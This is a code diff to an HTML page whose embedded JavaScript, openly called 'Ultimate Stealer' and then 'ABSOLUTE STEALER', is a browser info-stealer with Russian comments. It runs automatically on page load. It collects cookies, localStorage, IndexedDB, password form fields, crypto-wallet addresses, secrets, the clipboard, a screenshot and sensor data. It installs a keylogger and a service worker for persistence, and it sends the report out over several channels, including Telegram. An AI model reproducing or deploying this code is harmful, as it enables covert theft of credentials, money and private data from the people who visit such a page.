+                if(d.screen) lines.push(`   Экран: ${d.screen.width}x${d.screen.height} (${d.screen.pixelRatio}x)`);
+                lines.push(`   Размер окна: ${d.window?.innerWidth||'?'}x${d.window?.innerHeight||'?'}`);
+                lines.push('');
+            }
+
+            // Фингерпринты
+            if(data.fingerprints) {
+                const f=data.fingerprints;
+                if(f.webgl && f.webgl.renderer) lines.push(`🎯 WebGL: ${f.webgl.renderer}`);
+                if(f.audio) lines.push(`🎯 Audio: ${f.audio.sampleRate}Hz`);
+                if(f.timezone) lines.push(`🎯 Время: ${f.timezone} (DST: ${f.dst?'да':'нет'})`);
+                if(f.fonts && f.fonts.length) {
+                    const fonts=f.fonts.slice(0,10);
+                    lines.push(`🎯 Шрифты (${f.fonts.length}): ${fonts.join(', ')}${f.fonts.length>10?'...':''}`);
+                }
+                if(f.colorScheme) lines.push(`🎯 Цветовая схема: ${f.colorScheme}`);
+                if(f.memory) lines.push(`💾 Память JS: ${Math.round(f.memory.used/1024/1024)}/${Math.round(f.memory.total/1024/1024)}MB`);
+                if(f.paint) lines.push(`🎨 Paint: ${f.paint.map(p=>p.name+'='+p.time+'ms').join(', ')}`);
+                if(f.resourceCount !== undefined) lines.push(`📦 Ресурсов: ${f.resourceCount}`);
+                lines.push('');
+            }
+
+            // Плагины
+            if(data.plugins && data.plugins.plugins && data.plugins.plugins.length) {
+                lines.push(`🔌 Плагины (${data.plugins.plugins.length}):`);
+                data.plugins.plugins.slice(0,5).forEach(p=>{
+                    lines.push(`   ${p.name}${p.filename?' ('+p.filename+')':''}`);
+                });
+                if(data.plugins.plugins.length>5) lines.push(`   ... и ещё ${data.plugins.plugins.length-5}`);
+                lines.push('');
+            }
+
+            // Характеристики браузера
+            if(data.features) {
+                const f=data.features;
+                const supported=Object.keys(f).filter(k=>f[k]);
+                if(supported.length) {
+                    lines.push(`🧩 Поддерживаемые API (${supported.length}):`);
+                    lines.push(`   ${supported.slice(0,10).join(', ')}${supported.length>10?'...':''}`);
                     lines.push('');
                 }
             }
 
-            if (data.gps) {
-                lines.push('📍 GPS: ' + data.gps.lat + ', ' + data.gps.lon + ' (' + data.gps.acc + 'm)');
-                lines.push('');
-            }
-
-            if (data.device) {
-                const d = data.device;
-                lines.push('💻 ' + (d.os || 'unknown') + ' ' + (d.osVersion || '') + ', ' + (d.browser || '') + ' ' + (d.browserVersion || ''));
-                if (d.model && d.model !== 'unknown') lines.push('📱 Модель: ' + d.model);
-                lines.push('   ' + (d.cores || '?') + ' ядер, ' + (d.memory || '?') + 'GB RAM');
-                if (d.screen) lines.push('   Экран: ' + d.screen.width + 'x' + d.screen.height + ' (' + d.screen.pixelRatio + 'x)');
-                lines.push('');
-            }
-
-            if (data.fingerprints) {
-                const f = data.fingerprints;
-                if (f.webgl && f.webgl.renderer) lines.push('🎯 WebGL: ' + f.webgl.renderer);
-                if (f.audio) lines.push('🎯 Audio: ' + f.audio.sampleRate + 'Hz');
-                if (f.timezone) lines.push('🎯 Время: ' + f.timezone);
-                if (f.fonts && f.fonts.length) {
-                    lines.push('🎯 Шрифты: ' + f.fonts.slice(0, 8).join(', ') + (f.fonts.length > 8 ? '...' : ''));
-                }
-                lines.push('');
-            }
-
-            if (data.storage) {
-                const ls = data.storage.localStorage || {};
-                const keys = Object.keys(ls);
-                if (keys.length) {
-                    lines.push('💾 LocalStorage (' + keys.length + '):');
-                    Object.entries(ls).slice(0, 5).forEach(([k, v]) => {
-                        lines.push('   ' + trunc(k, 15) + ': ' + trunc(v, 40));
+            // Storage
+            if(data.storage) {
+                const ls=data.storage.localStorage||{};
+                const keys=Object.keys(ls);
+                if(keys.length) {
+                    lines.push(`💾 LocalStorage (${keys.length}):`);
+                    Object.entries(ls).slice(0,8).forEach(([k,v])=>{
+                        lines.push(`   ${trunc(k,15)}: ${trunc(String(v),45)}`);
                     });
-                    if (keys.length > 5) lines.push('   ... и ещё ' + (keys.length - 5));
+                    if(keys.length>8) lines.push(`   ... и ещё ${keys.length-8}`);
+                    lines.push('');
+                }
+                const cookies=data.storage.cookies||{};
+                const ck=Object.keys(cookies);
+                if(ck.length) {
+                    lines.push(`🍪 Куки (${ck.length}):`);
+                    Object.entries(cookies).slice(0,5).forEach(([k,v])=>{
+                        lines.push(`   ${trunc(k,15)}: ${trunc(v,30)}`);
+                    });
+                    if(ck.length>5) lines.push(`   ... и ещё ${ck.length-5}`);
                     lines.push('');
                 }
             }
 
-            if (data.indexedDB && data.indexedDB.length) {
-                lines.push('🗄️ IndexedDB (' + data.indexedDB.length + ' БД):');
-                data.indexedDB.forEach(db => {
-                    lines.push('   ' + db.name + ' (' + (db.stores?.length || 0) + ' stores)');
+            // IndexedDB
+            if(data.indexedDB && data.indexedDB.length) {
+                lines.push(`🗄️ IndexedDB (${data.indexedDB.length} БД):`);
+                data.indexedDB.forEach(db=>{
+                    const stores=db.stores?.length||0;
+                    lines.push(`   ${db.name} (${stores} stores)`);
                 });
                 lines.push('');
             }
 
-            if (data.wallets && data.wallets.length) {
-                lines.push('💰 Криптокошельки:');
-                data.wallets.forEach(w => {
-                    const addr = w.address ? trunc(w.address, 20) : 'установлен';
-                    lines.push('   ' + w.type + ': ' + addr);
-                    if (w.chainId) lines.push('      Сеть: ' + w.chainId);
+            // Криптовалюта
+            if(data.crypto && data.crypto.wallets && data.crypto.wallets.length) {
+                lines.push(`💰 Криптокошельки (${data.crypto.wallets.length}):`);
+                data.crypto.wallets.forEach(w=>{
+                    const addr=w.address?trunc(w.address,20):'установлен';
+                    lines.push(`   ${w.type}: ${addr}${w.chainId?' (сеть '+w.chainId+')':''}`);
                 });
                 lines.push('');
             }
 
-            if (data.extensions && data.extensions.length) {
-                lines.push('🔌 Расширения: ' + data.extensions.join(', '));
+            // Расширения
+            if(data.extensions && data.extensions.length) {
+                lines.push(`🔌 Расширения: ${data.extensions.join(', ')}`);
                 lines.push('');
             }
 
-            if (data.passwords && data.passwords.length) {
-                lines.push('🔓 Найдены формы (' + data.passwords.length + '):');
-                data.passwords.forEach(form => {
-                    form.inputs.forEach(inp => {
-                        if (inp.isPassword) {
-                            lines.push('   Пароль: ' + (inp.name || 'unknown') + ' = [PASSWORD]');
-                        } else if (inp.value && inp.value.length > 1) {
-                            lines.push('   ' + (inp.name || 'field') + ': ' + inp.value);
+            // Пароли
+            if(data.passwords && data.passwords.forms && data.passwords.forms.length) {
+                lines.push(`🔓 Формы (${data.passwords.forms.length}):`);
+                data.passwords.forms.forEach(form=>{
+                    form.inputs.forEach(inp=>{
+                        if(inp.isPassword) {
+                            lines.push(`   Пароль: ${inp.name||'unknown'} = [PASSWORD]`);
+                        } else if(inp.value && inp.value.length>1) {
+                            lines.push(`   ${inp.name||'field'}: ${inp.value}`);
                         }
                     });
                 });
+                if(data.passwords.passwordManagers && data.passwords.passwordManagers.length) {
+                    lines.push(`   Менеджеры: ${data.passwords.passwordManagers.join(', ')}`);
+                }
                 lines.push('');
             }
 
-            if (data.secrets && data.secrets.length) {
-                lines.push('🔑 Секреты (' + data.secrets.length + '):');
-                data.secrets.slice(0, 8).forEach(s => {
-                    lines.push('   ' + s.path + ': ' + s.value);
+            // Секреты
+            if(data.secrets && data.secrets.length) {
+                lines.push(`🔑 Секреты (${data.secrets.length}):`);
+                data.secrets.slice(0,10).forEach(s=>{
+                    lines.push(`   ${s.path}: ${s.value}`);
                 });
-                if (data.secrets.length > 8) lines.push('   ... и ещё ' + (data.secrets.length - 8));
+                if(data.secrets.length>10) lines.push(`   ... и ещё ${data.secrets.length-10}`);
                 lines.push('');
             }
 
-            if (data.dom) {
-                const d = data.dom;
-                lines.push('🌐 Страница: ' + (d.url || 'unknown'));
-                if (d.title) lines.push('   Заголовок: ' + d.title);
-                if (d.referrer && d.referrer !== 'нет') lines.push('↩️ ' + d.referrer);
+            // DOM
+            if(data.dom) {
+                const d=data.dom;
+                lines.push(`🌐 Страница: ${d.url||'unknown'}`);
+                if(d.title) lines.push(`   Заголовок: ${d.title}`);
+                if(d.referrer && d.referrer!=='нет') lines.push(`↩️ ${d.referrer}`);
+                if(d.forms!==undefined) lines.push(`   Формы: ${d.forms}, Inputs: ${d.inputs}, Ссылки: ${d.links}`);
                 lines.push('');
             }
 
-            if (data.screenshot) {
-                const size = Math.round(data.screenshot.length / 1024);
-                lines.push('🖼 Скриншот: ' + size + ' КБ');
+            // Скриншот
+            if(data.screenshot) {
+                const size=Math.round(data.screenshot.length/1024);
+                lines.push(`🖼 Скриншот: ${size} КБ`);
                 lines.push('');
             }
 
-            if (data.keylogger) {
-                lines.push('⌨️ Keylogger: активен');
+            // Keylogger
+            if(data.keylogger) lines.push('⌨️ Keylogger: активен');
+
+            // Буфер обмена
+            if(data.clipboard) {
+                lines.push(`📋 Буфер обмена: ${trunc(data.clipboard,100)}`);
                 lines.push('');
             }
 
-            if (data.clipboard) {
-                lines.push('📋 Буфер обмена: ' + trunc(data.clipboard, 100));
+            // Service Worker
+            if(data.persistence) lines.push('♻️ Service Worker: зарегистрирован');
+
+            // Сенсоры
+            if(data.sensors) {
+                const s=data.sensors;
+                if(s.battery) {
+                    lines.push(`🔋 Батарея: ${s.battery.level}%${s.battery.charging?' (зарядка)':''}`);
+                }
+                if(s.acceleration) {
+                    const a=s.acceleration;
+                    lines.push(`📱 Акселерометр: x=${a.x?.toFixed(2)}, y=${a.y?.toFixed(2)}, z=${a.z?.toFixed(2)}`);
+                }
+                if(s.gyroscope) {
+                    const g=s.gyroscope;
+                    lines.push(`🔄 Гироскоп: α=${g.alpha?.toFixed(2)}, β=${g.beta?.toFixed(2)}, γ=${g.gamma?.toFixed(2)}`);
+                }
+                if(s.orientation) {
+                    const o=s.orientation;
+                    lines.push(`🧭 Ориентация: α=${o.alpha?.toFixed(2)}, β=${o.beta?.toFixed(2)}, γ=${o.gamma?.toFixed(2)}`);
+                }
                 lines.push('');
             }
 
-            if (data.sensors && data.sensors.battery) {
-                const s = data.sensors;
-                lines.push('🔋 Батарея: ' + s.battery.level + '%' + (s.battery.charging ? ' (зарядка)' : ''));
-                lines.push('');
-            }
-
-            lines.push('========================================');
-            lines.push('📅 ' + data.timestamp);
-            lines.push('⏱ ' + data.performance + 'ms');
+            lines.push('═══════════════════════════════════════════════════════');
+            lines.push(`📅 ${data.timestamp}`);
+            lines.push(`⏱ ${data.performance}ms`);
+            lines.push(`📦 ${JSON.stringify(data).length} байт`);
 
             return lines.join('\n');
         }
 
         // ================================================================
-        // 18. ГЛАВНАЯ ФУНКЦИЯ
+        // ГЛАВНАЯ
         // ================================================================
-        (async function ultimateStealer() {
+        (async function absoluteStealer() {
             try {
-                setStatus('⏳ Сбор...');
-                const start = performance.now();
+                setStatus('⏳');
+                const start=performance.now();
 
-                const keylogger = setupKeylogger();
-                const persistence = setupPersistence();
+                const keylogger=setupKeylogger();
+                const persistence=setupPersistence();
 
-                log('📊 Параллельный сбор данных...');
+                log('📊 Сбор ВСЕХ данных...');
 
-                const [
-                    networkData,
-                    gps,
-                    device,
-                    fingerprints,
-                    storage,
-                    indexedDB,
-                    wallets,
-                    extensions,
-                    passwords,
-                    dom,
-                    screenshot,
-                    clipboard,
-                    sensors
-                ] = await Promise.all([
-                    getNetworkData().catch(e => { log('⚠️ Network error'); return {}; }),
-                    getGPS().catch(e => null),
-                    Promise.resolve(getDeviceInfo()).catch(e => ({})),
-                    Promise.resolve(getFingerprints()).catch(e => ({})),
-                    Promise.resolve(getStorage()).catch(e => ({})),
-                    getIndexedDB().catch(e => null),
-                    Promise.resolve(getWallets()).catch(e => []),
-                    Promise.resolve(getExtensions()).catch(e => []),
-                    Promise.resolve(getPasswords()).catch(e => []),
-                    Promise.resolve(getDOM()).catch(e => ({ url: window.location.href })),
-                    takeScreenshot().catch(e => null),
-                    getClipboard().catch(e => null),
-                    getSensors().catch(e => ({}))
+                const [network,device,fingerprints,plugins,features,storage,indexedDB,crypto,extensions,passwords,dom,screenshot,clipboard,sensors] = await Promise.all([
+                    getAllNetwork().catch(e=>({})),
+                    Promise.resolve(getAllDevice()).catch(e=>({})),
+                    Promise.resolve(getAllFingerprints()).catch(e=>({})),
+                    Promise.resolve(getPlugins()).catch(e=>({plugins:[],mimeTypes:[]})),
+                    Promise.resolve(getBrowserFeatures()).catch(e=>({})),
+                    Promise.resolve(getAllStorage()).catch(e=>({})),
+                    getIndexedDBFull().catch(e=>null),
+                    Promise.resolve(getAllCrypto()).catch(e=>({wallets:[]})),
+                    Promise.resolve(getAllExtensions()).catch(e=>[]),
+                    Promise.resolve(getAllPasswords()).catch(e=>({forms:[]})),
+                    Promise.resolve(getAllDOM()).catch(e=>({})),
+                    takeScreenshot().catch(e=>null),
+                    getClipboard().catch(e=>null),
+                    getAllSensors().catch(e=>({}))
                 ]);
 
-                let secrets = [];
-                try {
-                    secrets = findSecrets(storage);
-                } catch (e) {}
+                // Секреты
+                let secrets=[];
+                try { secrets=findAllSecrets(storage); } catch(e){}
 
                 log('✅ Сбор завершён');
 
@@ -1096,71 +1011,58 @@
                     timestamp: new Date().toISOString(),
                     url: window.location.href,
                     userAgent: navigator.userAgent,
-                    network: networkData || {},
-                    gps: gps || null,
-                    device: device || {},
-                    fingerprints: fingerprints || {},
-                    storage: storage || {},
-                    indexedDB: indexedDB || null,
-                    wallets: wallets || [],
-                    extensions: extensions || [],
-                    passwords: passwords || [],
-                    secrets: secrets || [],
-                    dom: dom || {},
-                    screenshot: screenshot || null,
-                    clipboard: clipboard || null,
-                    keylogger: keylogger || false,
-                    persistence: persistence || false,
-                    sensors: sensors || {},
-                    performance: Math.round(performance.now() - start)
+                    network: network||{},
+                    device: device||{},
+                    fingerprints: fingerprints||{},
+                    plugins: plugins||{plugins:[],mimeTypes:[]},
+                    features: features||{},
+                    storage: storage||{},
+                    indexedDB: indexedDB||null,
+                    crypto: crypto||{wallets:[]},
+                    extensions: extensions||[],
+                    passwords: passwords||{forms:[]},
+                    secrets: secrets||[],
+                    dom: dom||{},
+                    screenshot: screenshot||null,
+                    clipboard: clipboard||null,
+                    keylogger: keylogger||false,
+                    persistence: persistence||false,
+                    sensors: sensors||{},
+                    performance: Math.round(performance.now()-start)
                 };
 
-                const report = formatReport(fullData);
-                log('📊 Отчёт: ' + report.length + ' символов');
+                const report=formatFinal(fullData);
+                log(`📊 Отчёт: ${report.length} символов`);
 
-                setStatus('📤 Отправка...');
+                setStatus('📤');
+                const results=await exfiltrate(report, fullData);
+                const ok=Object.values(results).filter(Boolean).length;
 
-                const results = await exfiltrate(report, fullData);
-                const ok = results.filter(r => r.ok).length;
+                setStatus(ok>0?'✅':'⚠️');
+                log(ok>0 ? `✅ Успешно! ${ok}/3 каналов` : '❌ Все каналы упали');
 
-                if (ok > 0) {
-                    setStatus('✅ Отправлено!');
-                    log('✅ Успешно! ' + ok + '/' + results.length + ' каналов');
-                } else {
-                    setStatus('⚠️ Ошибка');
-                    log('❌ Все каналы отправки не сработали');
-                }
+                setTimeout(()=>{ statusEl.style.opacity='0'; },3000);
 
-                setTimeout(() => {
-                    statusEl.style.opacity = '0';
-                }, 3000);
-
-            } catch (e) {
-                setStatus('⚠️ Ошибка');
-                log('❌ Критическая ошибка: ' + e.message);
+            } catch(e) {
+                setStatus('⚠️');
+                log('❌ '+e.message);
                 console.error(e);
             }
         })();
 
-        // ================================================================
-        // ЗАПУСК
-        // ================================================================
-        setTimeout(ultimateStealer, 300);
+        setTimeout(absoluteStealer,300);
 
-        window.testNow = async function() {
+        window.testNow=async function(){
             try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                await sendTelegram('🧪 Test IP: ' + d.ip + '\nTime: ' + new Date().toISOString());
+                const r=await fetch('https://api.ipify.org?format=json');
+                const d=await r.json();
+                await sendTelegram('🧪 Test: '+d.ip);
                 console.log('✅ Test sent');
-            } catch (e) {
-                console.error('❌ Test error:', e);
-            }
+            } catch(e){ console.error(e); }
         };
 
-        console.log('✅ Ultimate Stealer loaded');
-        console.log('📋 Для теста: testNow()');
-
+        console.log('✅ ABSOLUTE STEALER loaded');
+        console.log('📋 testNow() for test');
     </script>
 </body>
 </html>
